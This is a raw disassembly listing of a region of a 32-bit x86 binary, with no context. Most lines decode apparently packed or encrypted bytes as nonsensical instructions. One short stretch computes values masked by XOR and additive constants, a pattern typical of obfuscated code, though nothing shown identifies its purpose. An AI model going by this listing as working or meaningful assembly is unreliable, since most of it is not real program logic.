  41b065:	inc    edx
  41b066:	jg     0x41b068
  41b068:	add    eax,0xdd49665e
  41b06d:	outs   dx,DWORD PTR ds:[esi]
  41b06e:	inc    esi
  41b06f:	and    edx,ebp
  41b071:	push   ebp
  41b072:	sbb    BYTE PTR [esi],al
  41b074:	int3   
  41b075:	fild   DWORD PTR [edi+esi*8-0x81c89aa]
  41b07c:	pop    ecx
  41b07d:	mov    ch,0xd6
  41b07f:	inc    ebx
  41b080:	pop    ds
  41b081:	mov    bh,0xfe
  41b083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b084:	retf   
  41b085:	sbb    BYTE PTR [eax-0x418a430b],al
  41b08b:	dec    eax
  41b08c:	pop    esp
  41b08d:	fbld   TBYTE PTR [esp+edx*8-0x69]
  41b091:	pushf  
  41b092:	aaa    
  41b093:	imul   esi,DWORD PTR [ebx-0x194370cd],0xffffffd8
  41b09a:	jns    0x41b044
  41b09c:	cli    
  41b09d:	mov    ch,0xd
  41b09f:	je     0x41b0ab
  41b0a1:	fidivr DWORD PTR [edi-0x54]
  41b0a4:	nop
  41b0a5:	inc    edx
  41b0a6:	movzx  ebp,BYTE PTR [ebp+0x677d475b]
  41b0ad:	mov    bl,0xa8
  41b0af:	ret    0x4bca
  41b0b2:	xchg   ecx,eax
  41b0b3:	div    DWORD PTR [ecx+edi*4]
  41b0b6:	(bad)  
  41b0b8:	icebp  
  41b0b9:	mov    dh,BYTE PTR [ecx]
  41b0bb:	outs   dx,DWORD PTR ds:[esi]
  41b0bc:	sti    
  41b0bd:	in     al,0x46
  41b0bf:	outs   dx,DWORD PTR ds:[esi]
  41b0c0:	ficomp DWORD PTR [edi-0x760dc403]
  41b0c6:	inc    ecx
  41b0c7:	xchg   ebx,eax
  41b0c8:	cdq    
  41b0c9:	ret    
  41b0ca:	fmul   DWORD PTR [edx-0x1d2f5d69]
  41b0d0:	xor    edx,DWORD PTR [ebx]
  41b0d2:	call   0x657f:0x5a23c50b
  41b0d9:	(bad)  
  41b0da:	inc    esp
  41b0db:	rcl    BYTE PTR [edi-0x56],0xd1
  41b0df:	(bad)  
  41b0e0:	jp     0x41b14b
  41b0e2:	sbb    DWORD PTR [eax-0x71a9fca8],0x5f2eaf6f
  41b0ec:	mov    BYTE PTR [ecx+0xe],dh
  41b0ef:	les    edi,FWORD PTR [ebx-0x1e]
  41b0f2:	or     eax,0xcf137c65
  41b0f8:	pop    eax
  41b0f9:	fmul   DWORD PTR [esi]
  41b0fb:	mov    BYTE PTR [edx+0x34],0x7f
  41b0ff:	mov    WORD PTR [edx-0x7a4d618e],?
  41b105:	jne    0x41b105
  41b107:	inc    esi
  41b108:	pop    eax
  41b109:	in     al,0x97
  41b10b:	shl    BYTE PTR [ebp-0x27],cl
  41b10e:	(bad)  
  41b10f:	jno    0x41b0dc
  41b111:	popa   
  41b112:	dec    ebp
  41b113:	xchg   edx,eax
  41b114:	inc    ecx
  41b115:	jmp    0x41b0db
  41b117:	sbb    ch,dl
  41b119:	enter  0xa05,0x2e
  41b11d:	repnz add eax,0x9642eea9
  41b123:	pushw  0x4e
  41b126:	scas   al,BYTE PTR es:[edi]
  41b127:	inc    edx
  41b128:	push   edi
  41b129:	dec    ebp
  41b12a:	jge    0x41b0dc
  41b12c:	data16 fdivr QWORD PTR [ebx-0x7e]
  41b130:	icebp  
  41b131:	xchg   ebp,eax
  41b132:	loope  0x41b101
  41b134:	jecxz  0x41b13e
  41b136:	cs pop ebp
  41b138:	jmp    0x2e99:0x256cda87
  41b13f:	shr    DWORD PTR [edi],0x52
  41b142:	scas   al,BYTE PTR es:[edi]
  41b143:	pusha  
  41b144:	(bad)  
  41b145:	stc    
  41b146:	sar    DWORD PTR [ecx+0x3f],cl
  41b149:	dec    edi
  41b14a:	cmp    BYTE PTR [ecx+0x2b],cl
  41b14d:	mov    bh,0xa3
  41b14f:	xchg   esp,eax
  41b150:	and    edi,eax
  41b152:	sub    eax,0x52004473
  41b157:	add    eax,0xe7819512
  41b15c:	cld    
  41b15d:	jnp    0x41b18e
  41b15f:	aad    0x2d
  41b161:	push   ss
  41b162:	dec    edi
  41b163:	jne    0x41b15e
  41b165:	inc    edx
  41b166:	aad    0xce
  41b168:	push   ebx
  41b169:	jbe    0x41b1a1
  41b16b:	not    bh
  41b16d:	mov    gs,WORD PTR ds:0x8d50e5b9
  41b173:	and    dh,BYTE PTR ds:0xffc2d890
  41b179:	fadd   st,st(3)
  41b17b:	sbb    eax,0xa0590eeb
  41b180:	dec    ecx
  41b181:	daa    
  41b182:	(bad)
  41b186:	jne    0x41b180
  41b188:	stos   DWORD PTR es:[edi],eax
  41b189:	inc    esp
  41b18a:	sub    BYTE PTR [ebx],al
  41b18c:	test   DWORD PTR [edx],0x5b355794
  41b192:	aad    0xb9
  41b194:	scas   eax,DWORD PTR es:[edi]
  41b195:	jle    0x41b178
  41b197:	adc    esi,eax
  41b199:	add    edi,DWORD PTR [eax]
  41b19b:	sbb    dh,dl
  41b19d:	xchg   esp,eax
  41b19e:	pop    esp
  41b19f:	in     al,dx
  41b1a0:	inc    edx
  41b1a1:	or     BYTE PTR [esi],ch
  41b1a3:	retf   
  41b1a4:	js     0x41b1a4
  41b1a6:	(bad)  
  41b1a7:	adc    eax,0xc681a5fb
  41b1ac:	popa   
  41b1ad:	pop    ecx
  41b1ae:	imul   esp,DWORD PTR [edi],0xffffffee
  41b1b1:	cld    
  41b1b2:	js     0x41b19f
  41b1b4:	pop    es
  41b1b5:	leave  
  41b1b6:	bound  esp,QWORD PTR [edx+0x6ea1b233]
  41b1bc:	adc    dh,ah
  41b1be:	pusha  
  41b1bf:	mov    esp,0xb0417ad6
  41b1c4:	mov    DWORD PTR [ebp-0x41e6619d],ebp
  41b1ca:	cs inc edi
  41b1cc:	sbb    eax,0xe678d210
  41b1d1:	ds sbb esi,0xffffff89
  41b1d5:	or     DWORD PTR [ebp-0x7a135078],esi
  41b1db:	dec    esp
  41b1dc:	push   di
  41b1de:	mov    dh,0xed
  41b1e0:	retf   0x648d
  41b1e3:	dec    ecx
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	shr    BYTE PTR ss:[bp+si-0x6a],0x2f
  41b1fb:	stos   BYTE PTR es:[edi],al
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b193
  41b205:	push   ebx
  41b206:	dec    esi
  41b207:	or     BYTE PTR [edi],bl
  41b209:	mov    esp,0xc17ae7c2
  41b20e:	mov    ds:0x683e2954,al
  41b213:	or     DWORD PTR ds:0x989acb65,edx
  41b219:	retf   
  41b21a:	push   cs
  41b21b:	mov    DWORD PTR [esi],ebp
  41b21d:	test   BYTE PTR [ecx],0xa7
  41b220:	xor    dl,BYTE PTR ds:0x6b96b555
  41b226:	pop    esi
  41b227:	xor    BYTE PTR [ecx+0x35],bl
  41b22a:	test   eax,0xb2e36a4d
  41b22f:	aam    0x34
  41b231:	loope  0x41b244
  41b233:	adc    DWORD PTR [ebx],edi
  41b235:	jmp    0x2582fe3f
  41b23a:	sbb    DWORD PTR [esi-0x34],esi
  41b23d:	mov    BYTE PTR [ecx-0x51],al
  41b240:	inc    eax
  41b241:	pop    eax
  41b242:	add    eax,0xd3297c3
  41b247:	cmp    eax,0xd2d440a9
  41b24c:	inc    ebp
  41b24d:	fbld   TBYTE PTR ds:0x619092ef
  41b253:	or     eax,0x6059c1b9
  41b258:	shl    DWORD PTR [esi],1
  41b25a:	jmp    0x41b2c8
  41b25c:	or     eax,0x3ff94cbc
  41b261:	scas   eax,DWORD PTR es:[edi]
  41b262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b263:	out    0x7f,al
  41b265:	push   esp
  41b266:	sub    esp,DWORD PTR [esi-0x150a7189]
  41b26c:	lods   al,BYTE PTR ds:[esi]
  41b26d:	dec    edi
  41b26e:	push   cs
  41b26f:	push   edx
  41b270:	dec    ebp
  41b271:	ret    0x14c7
  41b274:	mov    BYTE PTR [di-0x76fd],dh
  41b279:	xchg   ebp,eax
  41b27a:	lods   al,BYTE PTR ds:[esi]
  41b27b:	xchg   ebp,eax
  41b27c:	into   
  41b27d:	mov    ah,cl
  41b27f:	(bad)  [ebx]
  41b281:	and    ch,BYTE PTR [edx-0x10]
  41b284:	add    esi,ecx
  41b286:	adc    edx,DWORD PTR [edx+0x74]
  41b289:	sub    BYTE PTR ds:0xd7f05686,dh
  41b28f:	and    eax,0x9df2cbe9
  41b294:	pop    es
  41b295:	sar    BYTE PTR [ebx+edx*2+0x376ed72f],0xe0
  41b29d:	hlt    
  41b29e:	neg    DWORD PTR [esi+0x2]
  41b2a1:	jo     0x41b283
  41b2a3:	rol    DWORD PTR [edx-0x6e],cl
  41b2a6:	jp     0x41b253
  41b2a8:	jb     0x41b25b
  41b2aa:	rcl    dl,0x77
  41b2ad:	scas   al,BYTE PTR es:[edi]
  41b2ae:	cmp    BYTE PTR [ebx+eiz*4+0x3633e88f],ah
  41b2b5:	lods   al,BYTE PTR ds:[esi]
  41b2b6:	cld    
  41b2b7:	fs mov DWORD PTR cs:[ebp+0x9],ebx
  41b2bc:	inc    ebp
  41b2bd:	sub    BYTE PTR [ecx+0x2a1ce223],bl
  41b2c3:	dec    edi
  41b2c4:	test   eax,0x190c73b2
  41b2c9:	jbe    0x41b2d1
  41b2cb:	xchg   DWORD PTR [ecx-0x73],eax
  41b2ce:	jo     0x41b268
  41b2d0:	mov    eax,0x7712ed26
  41b2d5:	and    BYTE PTR [edx-0x51],bh
  41b2d8:	jnp    0x41b2c1
  41b2da:	sub    ecx,DWORD PTR [edi-0x4d]
  41b2dd:	mov    eax,0xc2475d3c
  41b2e2:	pop    edi
  41b2e3:	push   ecx
  41b2e4:	sbb    al,0xb
  41b2e6:	mov    ds,ebp
  41b2e8:	sbb    al,0xa4
  41b2ea:	pop    ebp
  41b2eb:	(bad)  
  41b2ec:	fmulp  st(7),st
  41b2ee:	pop    ecx
  41b2ef:	jae    0x41b277
  41b2f1:	enter  0x9dae,0xc2
  41b2f5:	xchg   edi,eax
  41b2f6:	jle    0x41b31f
  41b2f8:	scas   al,BYTE PTR es:[edi]
  41b2f9:	inc    eax
  41b2fa:	loopne 0x41b346
  41b2fc:	mov    ah,0x7d
  41b2fe:	shl    BYTE PTR ds:0xa6ba2d5f,cl
  41b304:	dec    ecx
  41b305:	je     0x41b354
  41b307:	or     bl,bl
  41b309:	cmp    eax,0x406943d
  41b30e:	call   0x2990529e
  41b313:	stos   DWORD PTR es:[edi],eax
  41b314:	jbe    0x41b385
  41b316:	ja     0x41b2c2
  41b318:	sub    dh,BYTE PTR [ecx+0x7c]
  41b31b:	pop    edi
  41b31c:	jo     0x41b2e1
  41b31e:	stos   DWORD PTR es:[edi],eax
  41b31f:	jp     0x41b2ac
  41b321:	or     bl,bl
  41b323:	mov    dh,0x72
  41b325:	(bad)  
  41b326:	lea    edx,[eax+0x1b28b57b]
  41b32c:	jne    0x41b376
  41b32e:	dec    edx
  41b32f:	adc    DWORD PTR [ebx-0x1],ebx
  41b332:	aas    
  41b333:	js     0x41b35e
  41b335:	pop    edx
  41b336:	cmp    eax,0x6c2bb5e5
  41b33b:	(bad)  
  41b33c:	lods   al,BYTE PTR ds:[esi]
  41b33d:	add    al,0xd9
  41b33f:	mov    ?,ecx
  41b341:	xchg   esi,eax
  41b342:	or     bh,bh
  41b344:	das    
  41b345:	mov    al,0xa8
  41b347:	dec    ebx
  41b348:	pop    edx
  41b349:	push   esi
  41b34a:	es arpl bx,ax
  41b34d:	inc    eax
  41b34e:	sub    DWORD PTR [esi+0x57],esi
  41b351:	in     al,dx
  41b352:	sub    ecx,ebp
  41b354:	add    al,cl
  41b356:	in     al,dx
  41b357:	jae    0x41b38b
  41b359:	push   es
  41b35a:	fild   DWORD PTR [edi]
  41b35c:	leave  
  41b35d:	(bad)  
  41b35e:	cs inc edi
  41b360:	mov    eax,ds:0x2c8cb265
  41b365:	(bad)  
  41b366:	sbb    eax,DWORD PTR [edx+0x69206159]
  41b36c:	jae    0x41b30b
  41b36e:	adc    al,0xde
  41b370:	add    eax,0xaae19d9a
  41b375:	jmp    0xfc74:0xfa97e426
  41b37c:	push   esi
  41b37d:	mov    esi,0x7a9b4393
  41b382:	or     DWORD PTR [ebp-0x6c1577aa],ebp
  41b388:	dec    edx
  41b389:	sbb    cl,BYTE PTR [edx-0x31909181]
  41b38f:	les    edx,FWORD PTR [ebp-0x10061798]
  41b395:	daa    
  41b396:	out    0xd6,al
  41b398:	sbb    eax,0xce5140a5
  41b39d:	dec    ecx
  41b39e:	inc    esi
  41b39f:	push   edi
  41b3a0:	mov    fs,WORD PTR [ebp+0x54e37845]
  41b3a6:	add    al,0x71
  41b3a8:	mov    edi,0xa0a81cb1
  41b3ad:	push   edi
  41b3ae:	dec    esi
  41b3af:	or     dh,BYTE PTR [ecx]
  41b3b1:	loope  0x41b389
  41b3b3:	pop    ss
  41b3b4:	dec    ebx
  41b3b5:	jbe    0x41b374
  41b3b7:	ret    
  41b3b8:	mov    esp,0x3945fe16
  41b3bd:	jg     0x41b359
  41b3bf:	mov    ah,0xb2
  41b3c1:	pushf  
  41b3c2:	push   edi
  41b3c3:	adc    esi,DWORD PTR [edx]
  41b3c5:	rol    cl,0x2a
  41b3c8:	out    0xb1,al
  41b3ca:	div    BYTE PTR [edi]
  41b3cc:	cmp    al,0xe3
  41b3ce:	push   ecx
  41b3cf:	cmp    al,0x1f
  41b3d1:	mov    esi,0x70ac97a6
  41b3d6:	repnz adc al,0xf2
  41b3d9:	mov    DWORD PTR [esi-0x143cf40f],edi
  41b3df:	loope  0x41b36e
  41b3e1:	inc    ebx
  41b3e2:	sbb    cl,ah
  41b3e4:	mov    dl,0x27
  41b3e6:	fwait
  41b3e7:	shl    BYTE PTR [edi],1
  41b3e9:	push   edi
  41b3ea:	xchg   ebp,eax
  41b3eb:	sub    al,0xba
  41b3ed:	pop    ds
  41b3ee:	arpl   WORD PTR [eax+0x7d],di
  41b3f1:	lahf   
  41b3f2:	inc    eax
  41b3f3:	jo     0x41b442
  41b3f5:	mov    bh,0xdd
  41b3f7:	test   BYTE PTR [ebp+edi*4+0x5696e59c],dl
  41b3fe:	retf   0x2af2
  41b401:	lods   eax,DWORD PTR ds:[esi]
  41b402:	repnz mov BYTE PTR [esi-0x14],bh
  41b406:	mov    ebx,DWORD PTR [ebx+0xf95ab25]
  41b40c:	jno    0x41b425
  41b40e:	mov    ch,BYTE PTR ds:0xc0205516
  41b414:	rol    DWORD PTR [edx+edi*8],cl
  41b417:	xor    al,0x1c
  41b419:	adc    BYTE PTR [edi-0x5a],dl
  41b41c:	imul   eax,ecx
  41b41f:	sub    esp,eax
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	cs push ds
  41b4bb:	cmp    edi,DWORD PTR [edx+0x787fe2c0]
  41b4c1:	adc    BYTE PTR [esi+0x78],bh
  41b4c4:	js     0x41b4a3
  41b4c6:	test   BYTE PTR [ebx],bh
  41b4c8:	ss pop esp
  41b4ca:	div    BYTE PTR [eax]
  41b4cc:	pop    ss
  41b4cd:	mov    WORD PTR [edx+0xd],es
  41b4d0:	clc    
  41b4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d2:	loop   0x41b500
  41b4d4:	gs leave 
  41b4d6:	pop    ss
  41b4d7:	xor    ch,dh
  41b4d9:	xchg   ebx,ebp
  41b4db:	das    
  41b4dc:	jnp    0x41b4cc
  41b4de:	mov    edx,0x43354aad
  41b4e3:	das    
  41b4e4:	jp     0x41b4a0
  41b4e6:	into   
  41b4e7:	mov    bh,0x5a
  41b4e9:	fdivp  st(7),st
  41b4eb:	int    0x7f
  41b4ed:	cs adc al,0x80
  41b4f0:	cmp    DWORD PTR [edi-0x1],ebp
  41b4f3:	(bad)  
  41b4f4:	add    DWORD PTR [ecx],ebp
  41b4f6:	inc    edx
  41b4f7:	push   ebp
  41b4f8:	arpl   WORD PTR [ebx],sp
  41b4fa:	ss ins BYTE PTR es:[edi],dx
  41b4fc:	xor    eax,0x4c60578c
  41b501:	or     ebx,esp
  41b503:	jge    0x41b567
  41b505:	retf   
  41b506:	sbb    al,0xd
  41b508:	push   eax
  41b509:	xlat   BYTE PTR ds:[ebx]
  41b50a:	loop   0x41b48c
  41b50c:	addr16 repz sub al,0xfb
  41b510:	repnz cmp al,0xf7
  41b513:	rcl    DWORD PTR fs:[ecx+0x7f341a60],1
  41b51a:	or     DWORD PTR [edx],0x43
  41b51d:	push   edi
  41b51e:	push   es
  41b51f:	push   cs
  41b520:	stos   BYTE PTR es:[edi],al
  41b521:	cmp    al,bh
  41b523:	dec    esp
  41b524:	call   0x25c00adf
  41b529:	fwait
  41b52a:	cwde   
  41b52b:	add    DWORD PTR [esi-0x73dfdfd3],0xc9c0e18a
  41b535:	mov    ?,WORD PTR [ebp-0x73]
  41b538:	mov    eax,ds:0x9222a070
  41b53d:	fadd   QWORD PTR [ebx+0x4b]
  41b540:	daa    
  41b541:	jb     0x41b581
  41b543:	mov    dl,0xa
  41b545:	xor    ecx,DWORD PTR [ecx+0x21]
  41b548:	adc    eax,0x3cb84184
  41b54d:	shr    DWORD PTR [esi],0x4b
  41b550:	enter  0x2890,0xcb
  41b554:	sub    ecx,DWORD PTR [eax+0x1d976df6]
  41b55a:	clc    
  41b55b:	(bad)  
  41b55c:	mov    bh,0xf1
  41b55e:	mov    cl,BYTE PTR [ebx-0x11]
  41b561:	cli    
  41b562:	inc    ebx
  41b563:	lea    ebx,[ebx-0xd07f9ca]
  41b569:	jmp    0xf802beef
  41b56e:	push   edi
  41b56f:	adc    ch,BYTE PTR [edi]
  41b571:	sub    BYTE PTR [eax-0x6a203e0d],cl
  41b577:	imul   edx,DWORD PTR ds:0x5fc31d9d,0x79
  41b57e:	outs   dx,BYTE PTR ds:[esi]
  41b57f:	in     al,0xfd
  41b581:	xor    eax,DWORD PTR [esi+0x1b7f23bb]
  41b587:	loop   0x41b56a
  41b589:	sbb    DWORD PTR ds:0x45a3744f,ebx
  41b58f:	sbb    al,0x22
  41b591:	cmp    edx,DWORD PTR [edx+0x408f3b4f]
  41b597:	inc    eax
  41b598:	inc    ecx
  41b599:	mov    ebx,0x786dab68
  41b59e:	push   edx
  41b59f:	call   0x6076e1fd
  41b5a4:	lahf   
  41b5a5:	into   
  41b5a6:	cli    
  41b5a7:	out    dx,al
  41b5a8:	sub    al,0xe
  41b5aa:	ja     0x41b57f
  41b5ac:	lahf   
  41b5ad:	mov    edi,0x9acc37a
  41b5b2:	out    dx,eax
  41b5b3:	ds mov dh,0xdf
  41b5b6:	std    
  41b5b7:	lods   eax,DWORD PTR ds:[esi]
  41b5b8:	xor    bh,BYTE PTR [ebp+0x6eaf23ef]
  41b5be:	fsub   st(5),st
  41b5c0:	mov    BYTE PTR [edx],al
  41b5c2:	or     dl,cl
  41b5c4:	mov    edi,0x92a7f44d
  41b5c9:	mov    dh,0xaa
  41b5cb:	nop
  41b5cc:	in     eax,dx
  41b5cd:	push   cs
  41b5ce:	xchg   edi,eax
  41b5cf:	pop    ebp
  41b5d0:	push   ds
  41b5d1:	mov    ds:0xcdfa0baa,al
  41b5d6:	sub    DWORD PTR [ebx-0x39],esp
  41b5d9:	cmp    eax,0x116138a1
  41b5de:	cmp    bh,BYTE PTR [ecx]
  41b5e0:	push   edx
  41b5e1:	push   ss
  41b5e2:	mov    dl,0xc1
  41b5e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e5:	xchg   esi,eax
  41b5e6:	neg    BYTE PTR [ecx+0x58]
  41b5e9:	test   al,0xd4
  41b5eb:	sahf   
  41b5ec:	retf   0xab3d
  41b5ef:	and    BYTE PTR [esi-0x30],0x5a
  41b5f3:	mov    ch,0xd3
  41b5f5:	shr    BYTE PTR [ebp-0x5e042e92],1
  41b5fb:	mov    BYTE PTR [eax],cl
  41b5fd:	cdq    
  41b5fe:	ins    DWORD PTR es:[edi],dx
  41b5ff:	and    eax,0x9f2aedee
  41b604:	int    0x19
  41b606:	add    cl,BYTE PTR ds:0x2628fe02
  41b60c:	xchg   edx,eax
  41b60d:	xchg   edi,eax
  41b60e:	(bad)  
  41b60f:	ss xchg edx,eax
  41b611:	cmp    BYTE PTR [eax-0x25a4eab5],bl
  41b617:	jge    0x41b5d5
  41b619:	cmp    eax,0x569766e7
  41b61e:	outs   dx,DWORD PTR ds:[esi]
  41b61f:	repnz or dh,cl
  41b622:	or     dh,ah
  41b624:	inc    ecx
  41b625:	in     eax,0xe7
  41b627:	jge    0x41b662
  41b629:	pop    ss
  41b62a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b62b:	cs xchg ebp,eax
  41b62d:	out    0xd7,al
  41b62f:	adc    dl,bl
  41b631:	mov    esp,0x36e14c34
  41b636:	mov    bl,dh
  41b638:	sub    BYTE PTR [edx+0x3e713d92],cl
  41b63e:	mov    dl,0x50
  41b640:	cmp    DWORD PTR [ebx-0x18],edx
  41b643:	jmp    0xe45a2b25
  41b648:	jne    0x41b6b1
  41b64a:	pop    esi
  41b64b:	jnp    0x41b61b
  41b64d:	push   es
  41b64e:	xchg   DWORD PTR [ebx],esp
  41b650:	fiadd  DWORD PTR [edi]
  41b652:	add    BYTE PTR [eax],dl
  41b654:	call   0xa8540a3b
  41b659:	inc    edi
  41b65a:	neg    DWORD PTR [esi]
  41b65c:	pop    esp
  41b65d:	and    bl,al
  41b65f:	xchg   esp,eax
  41b660:	cmp    al,0x2a
  41b662:	cmp    DWORD PTR [eax+0x94d237],edi
  41b668:	mul    DWORD PTR [ecx+eiz*4+0x8]
  41b66c:	adc    ecx,0xe6f2705f
  41b672:	jbe    0x41b642
  41b674:	or     DWORD PTR [ebx-0x2ee7cfe4],ecx
  41b67a:	jl     0x41b698
  41b67c:	sbb    eax,0x6ceaf0e0
  41b681:	add    ah,dh
  41b683:	jl     0x41b6b3
  41b685:	fbld   TBYTE PTR [eax+eiz*8+0x41]
  41b689:	out    dx,al
  41b68a:	xchg   esp,eax
  41b68b:	push   ecx
  41b68c:	rol    esp,cl
  41b68e:	ja     0x41b68c
  41b690:	rol    BYTE PTR [esi],0xa8
  41b693:	dec    ebp
  41b694:	loope  0x41b6c5
  41b696:	pop    ds
  41b697:	sub    BYTE PTR [esi-0x314ad246],bh
  41b69d:	int    0xb8
  41b69f:	xchg   edi,eax
  41b6a0:	xor    al,0x5
  41b6a2:	and    al,0x46
  41b6a4:	rcl    BYTE PTR [edx-0x7b],0x1b
  41b6a8:	aaa    
  41b6a9:	outs   dx,DWORD PTR ds:[esi]
  41b6aa:	lahf   
  41b6ab:	imul   BYTE PTR [edi]
  41b6ad:	js     0x41b6e8
  41b6af:	mov    edi,0xb39f716b
  41b6b4:	in     al,dx
  41b6b5:	sbb    eax,0x8fff5054
  41b6ba:	xor    ebx,DWORD PTR [ebx-0x2e0b9e98]
  41b6c0:	jmp    0xaad828ee
  41b6c5:	lock out dx,eax
  41b6c7:	fld    QWORD PTR gs:[ebx+0x60936f1b]
  41b6ce:	inc    eax
  41b6cf:	pop    eax
  41b6d0:	out    0x89,eax
  41b6d2:	(bad)  
  41b6d3:	pop    ss
  41b6d4:	mov    ch,0xba
  41b6d6:	xchg   ebx,eax
  41b6d7:	sub    eax,0xf6f9c435
  41b6dc:	adc    al,0x33
  41b6de:	rol    DWORD PTR [ebx],0xc6
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0x1a14970a]
  41b6f4:	or     eax,0x7fe0d8b7
  41b6f9:	js     0x41b70b
  41b6fb:	jle    0x41b775
  41b6fd:	js     0x41b6a8
  41b6ff:	mov    ds:0x86dec9fc,eax
  41b704:	adc    al,0xa2
  41b706:	pop    es
  41b707:	inc    edi
  41b708:	sbb    al,0x6b
  41b70a:	inc    edx
  41b70b:	scas   eax,DWORD PTR es:[edi]
  41b70c:	aas    
  41b70d:	push   edi
  41b70e:	sbb    al,0xd7
  41b710:	pop    ebx
  41b711:	scas   al,BYTE PTR es:[edi]
  41b712:	mov    bh,0xce
  41b714:	repnz mov ds:0x1415d0d6,al
  41b71a:	adc    eax,0xe532350a
  41b71f:	jmp    0x637d:0xe4b8c3ac
  41b726:	jmp    0x41b786
  41b728:	dec    eax
  41b729:	out    dx,al
  41b72a:	jo     0x41b6fc
  41b72c:	(bad)  
  41b72d:	cmp    DWORD PTR [esi+0x4e0df212],eax
  41b733:	jb     0x41b726
  41b735:	xor    edx,esi
  41b737:	mov    dl,0x42
  41b739:	pusha  
  41b73a:	loop   0x41b72f
  41b73c:	add    edi,edx
  41b73e:	mov    edi,DWORD PTR [eax+eax*2-0x55]
  41b742:	rcl    bh,0x5
  41b745:	sbb    ebp,DWORD PTR ds:0x6006ce55
  41b74b:	fsubr  QWORD PTR [esi-0x452f44b6]
  41b751:	and    eax,0xcdb45736
  41b756:	imul   ebx,ebp,0xffffff96
  41b759:	add    edx,DWORD PTR [ecx]
  41b75b:	sub    edx,DWORD PTR [eax-0x2236d926]
  41b761:	cmp    al,0x61
  41b763:	not    BYTE PTR ss:[ebp+0x3c]
  41b767:	sbb    cl,dl
  41b769:	aas    
  41b76a:	adc    al,0xc4
  41b76c:	jp     0x41b7df
  41b76e:	scas   al,BYTE PTR es:[edi]
  41b76f:	rcl    DWORD PTR [ebx+0x83403b3],0xf5
  41b776:	cmp    esp,edx
  41b778:	mov    ecx,esp
  41b77a:	stc    
  41b77b:	lea    esp,[esi-0x78]
  41b77e:	mov    bh,0x20
  41b780:	mov    dl,0x88
  41b782:	xchg   ecx,eax
  41b783:	ret    
  41b784:	mov    bl,0xba
  41b786:	adc    edi,DWORD PTR [ebp+0x52]
  41b789:	icebp  
  41b78a:	cmp    eax,0x4518c543
  41b78f:	test   cl,al
  41b791:	pop    ss
  41b792:	mov    dl,0x7b
  41b794:	inc    esi
  41b795:	sbb    ecx,ebp
  41b797:	cld    
  41b798:	add    al,0xb4
  41b79a:	mov    WORD PTR [ebx-0x29],?
  41b79d:	cmp    DWORD PTR [esi+0x2c],ebp
  41b7a0:	add    BYTE PTR [edi],cl
  41b7a2:	data16 sti 
  41b7a4:	dec    edx
  41b7a5:	add    ecx,DWORD PTR [esi-0x25]
  41b7a8:	sbb    DWORD PTR [edx-0x45e13834],ebp
  41b7ae:	xchg   ebp,eax
  41b7af:	into   
  41b7b0:	sbb    ebx,esi
  41b7b2:	cli    
  41b7b3:	push   ebx
  41b7b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7b5:	out    dx,eax
  41b7b6:	pushf  
  41b7b7:	dec    edi
  41b7b8:	cmp    al,0xe5
  41b7ba:	rcr    eax,0x93
  41b7bd:	xchg   edi,eax
  41b7be:	jne    0x41b81e
  41b7c0:	cld    
  41b7c1:	sbb    ebp,ebp
  41b7c3:	add    DWORD PTR [esi+0x6d],esi
  41b7c6:	imul   ecx,DWORD PTR [eax+eiz*1],0x57
  41b7ca:	inc    edi
  41b7cb:	and    al,0x6d
  41b7cd:	aaa    
  41b7ce:	mov    edi,0x6bcfdfca
